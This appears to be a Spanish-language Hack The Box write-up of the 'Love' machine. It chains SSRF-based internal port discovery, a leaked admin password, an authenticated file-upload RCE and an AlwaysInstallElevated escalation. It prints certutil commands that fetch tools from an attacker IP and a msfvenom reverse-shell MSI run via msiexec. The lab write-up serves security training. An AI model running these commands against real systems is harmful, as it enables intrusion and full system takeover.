---
title: Love Writeup
author: l0n3
date: 2025-04-21
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, openssl, SSRF, internal port discovery, metasploit]
---

![image](https://github.com/user-attachments/assets/00062550-916b-41a8-8d63-5cd491c00608)

```bash
# Nmap 7.95 scan initiated Sat Apr 19 02:08:10 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG ports 10.10.10.239
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.239 ()   Status: Up
Host: 10.10.10.239 ()   Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp/////, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
# Nmap done at Sat Apr 19 02:08:49 2025 -- 1 IP address (1 host up) scanned in 38.40 seconds
```

```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2025-04-19T00:35:41+00:00; +21m34s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-18T17:35:26-07:00
|_clock-skew: mean: 2h06m35s, deviation: 3h30m02s, median: 21m33s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-19T00:35:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 19 02:14:09 2025 -- 1 IP address (1 host up) scanned in 190.70 seconds
```

Realizando fuzzing veo que estos directorios me estan devolviendo un status-code 301, por lo que podria tratar de acceder.

```bash
Images             [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 194ms]
admin              [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 195ms]
plugins            [Status: 301, Size: 339, Words: 22, Lines: 10, Duration: 193ms]
includes           [Status: 301, Size: 340, Words: 22, Lines: 10, Duration: 200ms]
dist               [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 251ms]
licenses           [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 334ms]
IMAGES             [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 195ms]
```

/admin


![image](https://github.com/user-attachments/assets/ef3d3c0e-44cb-4553-bd26-6cb129f210dc)

Veo si hay algun exploit referente a voting system en exploit-db


![image](https://github.com/user-attachments/assets/878f73ab-4f03-476d-a75e-fea7ebc2a545)

Tambien de los puertos escaneado, podriamos ver si por https vemos lo mismo que por el puerto 80.
Ademas en el common name estamos viendo algo

```bash
commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
```
podriamos probar a conectarnos por openssl a la ip como cliente para inspeccionar el certificado.
```bash
openssl s_client -connect $IP:443  
```

```bash
subject=C=in, ST=m, L=norway, O=ValentineCorp, OU=love.htb, CN=staging.love.htb, emailAddress=roy@love.htb
```

Vemos que se esta aplicando virtual hosting en el cual tenemos dos DNS para meter dentro del /etc/hosts para que pueda resolver ese dns
Ahora si vamos a love.htb, vemos que me esta cargando lo mismo que poniendo solo la ip, asique ahora probamos ingresando a staging.love.htb a ver que hay.

![image](https://github.com/user-attachments/assets/c2e220e9-7e0a-49f8-9210-8e8b3a92c9c6)

probamos el submit pero no hace nada.
Pruebo crearme un archivo en mi mauqina con contenido, y exponerlo mediante un servidor que levanto en python y ver si al poner la url en el scanner este me llega la peticion, en ese caso estariamos ante un SSRF.

![image](https://github.com/user-attachments/assets/dc60c428-307c-41e0-ad37-dc6f9df21648)

Por lo tanto vemos que el status code es 200 por lo que la peticion se esta realizando correctamente a mi ip, y se esta mostrando el contenido de file en la web. Ahora podria probar mediante un archivo con codigo php ver si me lo ejecuta.
Veo que en la web no me esta mostrando nada, y si vemos el codigo fuente de la web vemos el codigo php en el html, por lo cual, no me lo esta interpretando.

![image](https://github.com/user-attachments/assets/1b9fd7c2-094a-41b3-9dcf-b2b8d601bd46)

Puebo con localhost, y efectivamente estoy viendo la web que esta expuesta del lado del cliente por el puerto 80, la estoy viendo dentro de la maquina victima. 
![image](https://github.com/user-attachments/assets/69dc068a-69a3-4ce0-955f-ee6e3fa55810)

Lo proximo que haria seria ver si del SSRF puedo hacer un Internal Port Discovery, para ver los puertos que no son accesibles para mi, pero si pueden estar habilitados para llamadas desde dentro. Por ejemplo, en el escaneo del principio

```bash
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
```
veo que el puerto 5000 no es accesible desde fuera, me esta devolviendo un 403. Veamos si puedo acceder por la web, mediante localhost:5000

![image](https://github.com/user-attachments/assets/8e065862-8393-4393-90a3-5a4173995845)
Bueno vemos una credencial ahi para el panel supongo yo que era /admin

```bash
admin: @LoveIsInTheAir!!!!
```
y efectivamente ingresamos al panel.
![image](https://github.com/user-attachments/assets/0c4654a2-7081-487b-82f3-67a4e6643c1a)

Ahora que estamos autenticados, probemos con el exploit siguiente.

```bash
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)        | php/webapps/49445.py
```
al ejecutar el script no estoy recibiendo nada. para debuggear y ver que es lo que esta pasando, podemos usar el burp como intermediario y ver las peticiones que se estan realizando para ver el porque no estan llegando.
![image](https://github.com/user-attachments/assets/14ca66cc-f0c4-4b72-a672-b18628df4de9)

al correr nuevamente el script, vemos lo siguiente
![image](https://github.com/user-attachments/assets/98d1b418-ad43-41d2-ac02-6437c0fd02a0)

en burp vemos que la peticion que se esta hacciendo es a /votesystem/admin/index.php
y esta devolviendo un 404. porque nosotros no estamos en /votesystem, estamos en /admin, por lo tanto habria que modificar el script para quitar el /votesystem y correrlo nuevamente.

y ganamos la shell
![image](https://github.com/user-attachments/assets/612ed1a2-80bb-4c0c-abc6-9d5a73b4deee)
Al dirigirnos a c:\Users\Phoebe\Desktop vamos a encontrar la primer flag de la maquina.

----------

En el directorio Temp vamos a traernos winpeas para analizar el sistema, levanto en mi maquina un servidor en python donde tengo el archivo .exe y dentro de la maquina victima
```bash
certutil.exe -f -urlcache -split http://10.10.16.3/winPEASx64.exe winPEAS.exe
```
para traerme el archivo a la maquina victima.
con winpeas vemos lo siguiente:

```bash
Checking AlwaysInstallElevated
  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated                                                                                                              
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```
ahora en mi terminal ejecuto lo siguiente
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```

en LHOST pongo mi ip y LPORT el puerto por donde voy a querer entablar la shell, plataforma windows, ya que es una maquina windows, y la flag -a para especificar la arquitectura que en este caso es x64.
al ejecutar esto en mi terminal me crea un archivo .msi, me levanto mi servidor en python para exponer el archivo, y dentro de la maquina windows, ejecuto 
```bash
certutil.exe -f -urlcache -split http://10.10.16.3/reverse.msi reverse.msi
```

cuando ya tengo el archivo en la maquina solo queda ejecutarlo de la siguiente manera.
en mi terminal me pongo en escucha por el puerto que especifique anteriormente, en este caso el 443, y dentro de la maquina windows 
```bash
msiexec /quiet /qn /i reverse.msi
```

al ejecutarse gano la shell como administrator y capturo la ultima flag.






